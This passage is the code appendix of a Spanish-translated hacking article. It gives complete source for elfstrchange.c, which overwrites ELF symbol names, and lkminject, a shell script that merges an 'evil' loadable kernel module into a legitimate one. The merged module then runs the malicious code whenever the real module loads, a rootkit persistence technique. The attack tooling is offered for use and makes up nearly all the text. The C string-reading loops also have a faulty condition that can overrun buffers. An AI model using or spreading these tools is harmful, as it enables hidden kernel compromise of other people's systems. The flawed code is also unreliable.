  [7] Tripwire
      http://www.tripwire.org

  [8] Modulos cargables del Kernel Solaris por Plasmoid
      http://www.thc.org/papers/slkm-1.0.html



--[ 9 - Codigo

----[ 9.1 - ElfStrChange

/*
* elfstrchange.c by truff <truff@projet7.org>
* Change the value of a symbol name in the .strtab section
*
* Usage: elfstrchange elf_object sym_name sym_name_replaced
*
*/

#include <stdlib.h>
#include <stdio.h>
#include <elf.h>

#define FATAL(X) { perror (X);exit (EXIT_FAILURE); }


int ElfGetSectionName (FILE *fd, Elf32_Word sh_name,
                       Elf32_Shdr *shstrtable, char *res, size_t len);

Elf32_Off ElfGetSymbolByName (FILE *fd, Elf32_Shdr *symtab,
                       Elf32_Shdr *strtab, char *name, Elf32_Sym *sym);

Elf32_Off ElfGetSymbolName (FILE *fd, Elf32_Word sym_name,
                       Elf32_Shdr *strtable, char *res, size_t len);


int main (int argc, char **argv)
{
  int i;
  int len = 0;
  char *string;
  FILE *fd;
  Elf32_Ehdr hdr;
  Elf32_Shdr symtab, strtab;
  Elf32_Sym sym;
  Elf32_Off symoffset;

  fd = fopen (argv[1], "r+");
  if (fd == NULL)
    FATAL ("fopen");

  if (fread (&hdr, sizeof (Elf32_Ehdr), 1, fd) < 1)
    FATAL ("Elf header corrupted");

  if (ElfGetSectionByName (fd, &hdr, ".symtab", &symtab) == -1)
  {
    fprintf (stderr, "Can't get .symtab section\n");
    exit (EXIT_FAILURE);
  }

  if (ElfGetSectionByName (fd, &hdr, ".strtab", &strtab) == -1)
  {
    fprintf (stderr, "Can't get .strtab section\n");
    exit (EXIT_FAILURE);
  }


  symoffset = ElfGetSymbolByName (fd, &symtab, &strtab, argv[2], &sym);
  if (symoffset == -1)
  {
    fprintf (stderr, "Symbol %s not found\n", argv[2]);
    exit (EXIT_FAILURE);
  }


  printf ("[+] Symbol %s located at 0x%x\n", argv[2], symoffset);

  if (fseek (fd, symoffset, SEEK_SET) == -1)
    FATAL ("fseek");

  if (fwrite (argv[3], 1, strlen(argv[3]), fd) < strlen (argv[3]))
    FATAL ("fwrite");

  printf ("[+] .strtab entry overwriten with %s\n", argv[3]);

  fclose (fd);

  return EXIT_SUCCESS;
}

Elf32_Off ElfGetSymbolByName (FILE *fd, Elf32_Shdr *symtab,
            Elf32_Shdr *strtab, char *name, Elf32_Sym *sym)
{
  int i;
  char symname[255];
  Elf32_Off offset;

  for (i=0; i<(symtab->sh_size/symtab->sh_entsize); i++)
  {
    if (fseek (fd, symtab->sh_offset + (i * symtab->sh_entsize),
               SEEK_SET) == -1)
      FATAL ("fseek");

    if (fread (sym, sizeof (Elf32_Sym), 1, fd) < 1)
      FATAL ("Symtab corrupted");

    memset (symname, 0, sizeof (symname));
    offset = ElfGetSymbolName (fd, sym->st_name,
                        strtab, symname, sizeof (symname));
    if (!strcmp (symname, name))
      return offset;
  }

  return -1;
}


int ElfGetSectionByIndex (FILE *fd, Elf32_Ehdr *ehdr, Elf32_Half index,
    Elf32_Shdr *shdr)
{
  if (fseek (fd, ehdr->e_shoff + (index * ehdr->e_shentsize),
             SEEK_SET) == -1)
    FATAL ("fseek");

  if (fread (shdr, sizeof (Elf32_Shdr), 1, fd) < 1)
    FATAL ("Sections header corrupted");

  return 0;
}


int ElfGetSectionByName (FILE *fd, Elf32_Ehdr *ehdr, char *section,
                         Elf32_Shdr *shdr)
{
  int i;
  char name[255];
  Elf32_Shdr shstrtable;

  /*
   * Get the section header string table
   */
  ElfGetSectionByIndex (fd, ehdr, ehdr->e_shstrndx, &shstrtable);

  memset (name, 0, sizeof (name));

  for (i=0; i<ehdr->e_shnum; i++)
  {
    if (fseek (fd, ehdr->e_shoff + (i * ehdr->e_shentsize),
               SEEK_SET) == -1)
      FATAL ("fseek");

    if (fread (shdr, sizeof (Elf32_Shdr), 1, fd) < 1)
      FATAL ("Sections header corrupted");

    ElfGetSectionName (fd, shdr->sh_name, &shstrtable,
                       name, sizeof (name));
    if (!strcmp (name, section))
    {
      return 0;
    }
  }
  return -1;
}


int ElfGetSectionName (FILE *fd, Elf32_Word sh_name,
    Elf32_Shdr *shstrtable, char *res, size_t len)
{
  size_t i = 0;

  if (fseek (fd, shstrtable->sh_offset + sh_name, SEEK_SET) == -1)
    FATAL ("fseek");

  while ((i < len) || *res == '\0')
  {
    *res = fgetc (fd);
    i++;
    res++;
  }

  return 0;
}


Elf32_Off ElfGetSymbolName (FILE *fd, Elf32_Word sym_name,
    Elf32_Shdr *strtable, char *res, size_t len)
{
  size_t i = 0;

  if (fseek (fd, strtable->sh_offset + sym_name, SEEK_SET) == -1)
    FATAL ("fseek");

  while ((i < len) || *res == '\0')
  {
    *res = fgetc (fd);
    i++;
    res++;
  }

  return (strtable->sh_offset + sym_name);
}
/* EOF */



----] 9.2 Lkminject

#!/bin/sh
#
# lkminject by truff (truff@projet7.org)
#
# Injects a Linux lkm into another one.
#
# Usage:
# ./lkminfect.sh original_lkm.o evil_lkm.c
#
# Notes:
# You have to modify evil_lkm.c as explained bellow:
# In the init_module code, you have to insert this line, just after
# variables init:
# dumm_module ();
#
# In the cleanup_module code, you have to insert this line, just after
# variables init:
# dummcle_module ();
#
#      http://www.projet7.org                  - Security Researchs -
###########################################################################


sed -e s/init_module/evil_module/ $2 > tmp
mv tmp $2

sed -e s/cleanup_module/evclean_module/ $2 > tmp
mv tmp $2

# Replace the following line with the compilation line for your evil lkm
# if needed.
make

ld -r $1 $(basename $2 .c).o -o evil.o

./elfstrchange evil.o init_module dumm_module
./elfstrchange evil.o evil_module init_module
./elfstrchange evil.o cleanup_module dummcle_module
./elfstrchange evil.o evclean_module cleanup_module

mv evil.o $1
rm elfstrchange

|=[ EOF ]=---------------------------------------------------------------=|

#############################################
# Traducido por FuZzZ <fuzzz__@hotmail.com> #
# para EST <www.est.cl>. Slds               #
# 09/09/03                                  #
#############################################

